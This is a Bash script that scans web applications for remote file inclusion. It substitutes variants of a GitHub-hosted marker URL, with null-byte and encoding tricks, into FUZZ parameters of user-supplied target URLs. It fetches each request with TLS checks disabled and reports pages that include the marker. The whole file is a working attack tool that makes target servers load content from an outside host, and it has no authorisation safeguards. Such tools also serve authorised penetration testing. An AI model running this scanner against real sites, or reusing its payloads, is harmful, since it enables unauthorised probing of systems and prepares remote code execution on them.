#!/usr/bin/env bash
# rfi_scanner.sh — RFI-only sequential scanner using only a GitHub raw marker (no example.com)
# Detects inclusion by searching for "Testing RFI" in responses.
set -euo pipefail

# print a leading blank line
printf "\n"

# -------------------------
# Colors
# -------------------------
COLOR_RESET=$'\033[0m'
COLOR_DARK_RED=$'\033[0;31m'
COLOR_DARK_GREEN=$'\033[0;32m'
COLOR_LIGHT_CYAN=$'\033[1;36m'
COLOR_MUTED_BLUE=$'\033[0;36m'
COLOR_YELLOW=$'\033[0;33m'
COLOR_WHITE=$'\033[0;37m'
COLOR_PROMPT_YELLOW=$'\033[1;33m'   # bright/light yellow

# -------------------------
# Defaults
# -------------------------
TIMEOUT=12
GAP=0.4
USER_AGENT="rfi-only-scanner/1.0"
TMPDIR="$(mktemp -d -t rfi.XXXX)"
SAVE_DIR="./matched_bodies_rfi"
SAVE_BODIES=false

# Force no proxy for this process
unset HTTP_PROXY HTTPS_PROXY http_proxy https_proxy ALL_PROXY all_proxy no_proxy NO_PROXY

# -------------------------
# helpers
# -------------------------
info(){ printf "%b\n" "${COLOR_LIGHT_CYAN}$*${COLOR_RESET}"; }
note(){ printf "%b\n" "${COLOR_YELLOW}$*${COLOR_RESET}"; }
ok(){ printf "%b\n" "${COLOR_DARK_GREEN}$*${COLOR_RESET}"; }
err(){ printf "%b\n" "${COLOR_DARK_RED}$*${COLOR_RESET}"; }
plain(){ printf "%b\n" "${COLOR_WHITE}$*${COLOR_RESET}"; }

sanitize_fname(){ echo "$1" | sed 's#[:/?&=]#_#g' | tr -s '_' | cut -c1-200; }

prompt(){ local var="$1"; local txt="$2"; printf "%b" "${COLOR_PROMPT_YELLOW}${txt}${COLOR_RESET}"; read -r "$var"; }

# fetch (ignore TLS cert validation)
fetch_to_file(){ local url="$1"; local out="$2"; curl -sS -k --max-time "$TIMEOUT" -A "$USER_AGENT" -L "$url" -o "$out"; }


# -------------------------
# Header (dark red) + blank line
# -------------------------
printf "%b\n\n" "${COLOR_DARK_RED}RFI scanner (sequential). The script will try remote payloads based on your GitHub raw marker and look for the marker 'Testing RFI'.${COLOR_RESET}"

# -------------------------
# Interactive inputs
# -------------------------
prompt RFI_URLS_FILE "Enter RFI URLs with parameter values as FUZZ: "
if [[ ! -f "$RFI_URLS_FILE" ]]; then err "File not found: $RFI_URLS_FILE"; exit 1; fi

prompt USER_GAP "Enter gap/delay between requests in seconds (e.g. 0.4): "
if [[ -z "$USER_GAP" ]]; then USER_GAP="$GAP"; fi
GAP="$USER_GAP"

prompt SAVE_ANS "Save matched response bodies? (y/N): "
if [[ "${SAVE_ANS}" =~ ^([yY])$ ]]; then SAVE_BODIES=true; mkdir -p "$SAVE_DIR"; fi

# Clean input URLs
mapfile -t RFI_URLS < <(sed -E '/^\s*($|#)/d' "$RFI_URLS_FILE")
if [[ ${#RFI_URLS[@]} -eq 0 ]]; then err "No RFI URLs found."; exit 1; fi

# -------------------------
# Your GitHub raw marker URL (only payload used)
# -------------------------
GITHUB_RAW_MARKER="https://raw.githubusercontent.com/payload10/Split-Windows-and-Linux-LFI-Payloads/main/rfi.txt"

# -------------------------
# Build payload variants from the single GitHub raw marker (deduped)
# -------------------------
rfi_variants_for(){
  local base="$1"
  printf "%s\n" \
    "$base" \
    "${base}/" \
    "${base}?q=rfi_test" \
    "${base}#_rfi" \
    "${base}%00" \
    "$(python3 - <<PY - "$base"
import sys, urllib.parse
print(urllib.parse.quote(sys.argv[1], safe=''))
PY
)" || true
}

declare -A seen
RFI_PAYLOADS=()
while IFS= read -r v; do
  [[ -z "$v" ]] && continue
  if [[ -z "${seen[$v]:-}" ]]; then RFI_PAYLOADS+=( "$v" ); seen[$v]=1; fi
done < <(rfi_variants_for "$GITHUB_RAW_MARKER")

# detection marker to look for in response bodies
DETECT_MARKER="Testing RFI"

# -------------------------
# Scan loop (sequential)
# -------------------------
total=0; hits=0
info "\n=== Starting RFI scan (sequential) ==="

for url_template in "${RFI_URLS[@]}"; do
  if [[ "$url_template" != *FUZZ* ]]; then plain "Skipping (no FUZZ token): $url_template"; continue; fi

  for payload in "${RFI_PAYLOADS[@]}"; do
    total=$((total+1))
    target="${url_template//FUZZ/$payload}"
    bodyfile="${TMPDIR}/rfi_${total}_$((RANDOM)).body"

    if ! fetch_to_file "$target" "$bodyfile"; then
      plain "[ERR] $target (request failed or timed out)"
      sleep "$GAP"
      continue
    fi

    body_len=$(wc -c < "$bodyfile" 2>/dev/null || echo 0)

    if grep -Fqi -- "$DETECT_MARKER" "$bodyfile" 2>/dev/null; then
      hits=$((hits+1))
      printf "%b" "${COLOR_DARK_GREEN}${target}${COLOR_RESET}"
      printf " "
      printf "%b\n" "${COLOR_DARK_RED}- Potentially Vulnerable RFI${COLOR_RESET}"
      note "Detected marker: ${DETECT_MARKER} (len ${body_len})"
      if $SAVE_BODIES; then fname="$(sanitize_fname "$target")__RFI__${hits}.html"; cp -f "$bodyfile" "${SAVE_DIR}/${fname}" 2>/dev/null || true; fi
    else
      # no marker -> print URL normal + muted-blue suffix
      printf "[%s bytes] %s %b(no obvious RFI)%b\n" "$body_len" "$target" "$COLOR_MUTED_BLUE" "$COLOR_RESET"
    fi

    rm -f "$bodyfile"
    sleep "$GAP"
  done
done

printf "\n"
printf "%b\n\n" "${COLOR_DARK_RED}=== RFI scan complete. Hits found: ${hits} (total requests: ${total}) ===${COLOR_RESET}"
if $SAVE_BODIES; then info "Saved matched bodies to ${SAVE_DIR}"; fi
rm -rf "$TMPDIR"
exit 0
